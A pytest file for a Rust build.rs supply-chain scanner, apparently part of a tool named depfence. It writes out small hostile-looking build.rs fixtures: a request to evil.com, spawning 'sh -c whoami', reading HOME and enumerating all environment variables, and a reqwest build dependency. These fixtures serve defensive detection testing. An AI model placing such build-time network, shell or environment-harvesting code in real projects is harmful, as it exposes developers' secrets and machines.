"""Tests for RustBuildScanner — Cargo build.rs supply-chain risks."""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from depfence.scanners.rust_build_scanner import RustBuildScanner


@pytest.fixture
def scanner():
    return RustBuildScanner()


def run(scanner, project_dir):
    return asyncio.get_event_loop().run_until_complete(scanner.scan_project(project_dir))


class TestNetworkAccess:
    def test_reqwest_in_build_rs(self, tmp_path, scanner):
        build = tmp_path / "build.rs"
        build.write_text('use reqwest;\nfn main() { reqwest::blocking::get("http://evil.com"); }')
        findings = run(scanner, tmp_path)
        rs01 = [f for f in findings if f.metadata.get("rule") == "RS-01"]
        assert len(rs01) == 1
        assert rs01[0].severity.name == "CRITICAL"

    def test_std_net_in_build_rs(self, tmp_path, scanner):
        build = tmp_path / "build.rs"
        build.write_text('use std::net;\nfn main() {}')
        findings = run(scanner, tmp_path)
        rs01 = [f for f in findings if f.metadata.get("rule") == "RS-01"]
        assert len(rs01) == 1

    def test_clean_build_rs(self, tmp_path, scanner):
        build = tmp_path / "build.rs"
        build.write_text('fn main() { println!("cargo:rerun-if-changed=build.rs"); }')
        findings = run(scanner, tmp_path)
        assert len(findings) == 0


class TestProcessSpawning:
    def test_command_new(self, tmp_path, scanner):
        build = tmp_path / "build.rs"
        build.write_text('use std::process::Command;\nfn main() { Command::new("sh").arg("-c").arg("whoami").output(); }')
        findings = run(scanner, tmp_path)
        rs02 = [f for f in findings if f.metadata.get("rule") == "RS-02"]
        assert len(rs02) == 1


class TestEnvExfil:
    def test_non_cargo_env_var(self, tmp_path, scanner):
        build = tmp_path / "build.rs"
        build.write_text('use std::env;\nfn main() { let _ = env::var("HOME"); }')
        findings = run(scanner, tmp_path)
        rs03 = [f for f in findings if f.metadata.get("rule") == "RS-03"]
        assert len(rs03) == 1

    def test_cargo_env_var_ok(self, tmp_path, scanner):
        build = tmp_path / "build.rs"
        build.write_text('use std::env;\nfn main() { let _ = env::var("CARGO_PKG_NAME"); }')
        findings = run(scanner, tmp_path)
        rs03 = [f for f in findings if f.metadata.get("rule") == "RS-03"]
        assert len(rs03) == 0

    def test_env_vars_enumerate(self, tmp_path, scanner):
        build = tmp_path / "build.rs"
        build.write_text('use std::env;\nfn main() { for (k, v) in env::vars() { println!("{k}={v}"); } }')
        findings = run(scanner, tmp_path)
        rs03 = [f for f in findings if f.metadata.get("rule") == "RS-03"]
        assert len(rs03) == 1


class TestBuildDeps:
    def test_suspicious_build_dep(self, tmp_path, scanner):
        cargo = tmp_path / "Cargo.toml"
        cargo.write_text('[package]\nname = "evil"\nversion = "0.1.0"\n\n[build-dependencies]\nreqwest = "0.11"\n')
        findings = run(scanner, tmp_path)
        rs05 = [f for f in findings if f.metadata.get("rule") == "RS-05"]
        assert len(rs05) == 1
        assert rs05[0].metadata["dep"] == "reqwest"

    def test_normal_build_dep(self, tmp_path, scanner):
        cargo = tmp_path / "Cargo.toml"
        cargo.write_text('[package]\nname = "safe"\nversion = "0.1.0"\n\n[build-dependencies]\ncc = "1.0"\n')
        findings = run(scanner, tmp_path)
        rs05 = [f for f in findings if f.metadata.get("rule") == "RS-05"]
        assert len(rs05) == 0


class TestSkipDirs:
    def test_target_dir_skipped(self, tmp_path, scanner):
        target_dir = tmp_path / "target" / "debug" / "build" / "evil"
        target_dir.mkdir(parents=True)
        build = target_dir / "build.rs"
        build.write_text('use reqwest;\nfn main() {}')
        findings = run(scanner, tmp_path)
        assert len(findings) == 0
